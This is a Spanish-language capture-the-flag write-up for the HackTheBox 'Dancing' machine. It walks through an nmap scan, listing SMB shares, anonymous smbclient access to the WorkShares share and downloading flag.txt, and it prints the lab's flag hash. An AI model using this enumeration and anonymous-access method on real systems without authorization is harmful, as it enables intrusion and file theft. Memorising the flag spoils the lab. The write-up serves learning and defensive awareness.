# 🎯 Dancing — HackTheBox (Starting Point)

## Información General

| Campo | Detalle |
|-------|---------|
| **Plataforma** | HackTheBox — Starting Point |
| **Dificultad** | Muy Fácil |
| **OS** | Windows |
| **Tags** | `smb` `anonymous-login` `file-share` `enumeration` |

---

## Objetivo

Acceder a un recurso compartido SMB sin credenciales (contraseña en blanco) para recuperar la flag del sistema.

---

## Herramientas Utilizadas

- `nmap` — enumeración de puertos y servicios
- `smbclient` — cliente para interactuar con recursos compartidos SMB

---

## Conceptos Clave

- **SMB** (Server Message Block): protocolo de comunicación que permite compartir archivos e impresoras en red. Muy utilizado en entornos Windows.
- Opera principalmente en el **puerto 445** (también en 139 para compatibilidad con NetBIOS).
- El servicio en el puerto 445 se identifica como `microsoft-ds`.

---

## Metodología

### 1. Reconocimiento — Escaneo de puertos

```bash
nmap -sS -sV 10.129.1.12
```

**Resultado:**
```
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds ?
Service Info: OS: Windows
```

El objetivo corre Windows y expone SMB en los puertos estándar 139 y 445.

---

### 2. Enumeración — Listado de recursos compartidos

Se utiliza `smbclient` con el flag `-L` para listar los shares disponibles:

```bash
smbclient -L 10.129.1.12
```

**Resultado (password en blanco):**
```
Sharename    Type    Comment
---------    ----    -------
ADMIN$       Disk    Remote Admin
C$           Disk    Default share
IPC$         IPC     Remote IPC
WorkShares   Disk
```

Hay **4 shares** disponibles. Los shares `ADMIN$`, `C$` e `IPC$` son administrativos y generalmente requieren credenciales. El share **`WorkShares`** no tiene comentario, lo que lo hace candidato a probar con acceso anónimo.

---

### 3. Acceso y Explotación

Se intenta acceder a `WorkShares` con contraseña en blanco:

```bash
smbclient \\\\10.129.1.12\\WorkShares
```

El acceso es exitoso. Dentro del share se navega con comandos similares a una shell:

```bash
smb: \> ls
# Listado de directorios

smb: \> cd James.P
smb: \James.P> ls
  flag.txt    A    32    Mon Mar 29 05:26:57 2021
```

Se descarga el archivo con el comando `get`:

```bash
smb: \James.P> get flag.txt
```

> **Nota:** En la shell de SMB no se puede usar `cat` directamente. Es necesario descargar el archivo con `get` y leerlo en la máquina local.

---

### 4. Captura de Flag

Una vez descargado el archivo en la máquina local:

```bash
cat flag.txt
```

---

## Flags

| Tipo | Hash |
|------|------|
| **Root Flag** | `5f61c10dffbc77a704d76016a22f1664` |

---

## Lecciones Aprendidas

1. **SMB con acceso anónimo** es una misconfiguration muy común en entornos corporativos mal configurados.
2. Los shares administrativos (`ADMIN$`, `C$`) suelen estar protegidos, pero shares personalizados pueden quedar expuestos sin intención.
3. La metodología correcta es **enumerar antes de atacar**: listar todos los shares y probar cuáles son accesibles con credenciales mínimas o nulas.
4. El comando `get` en smbclient es el equivalente a `download` — fundamental para exfiltrar archivos.
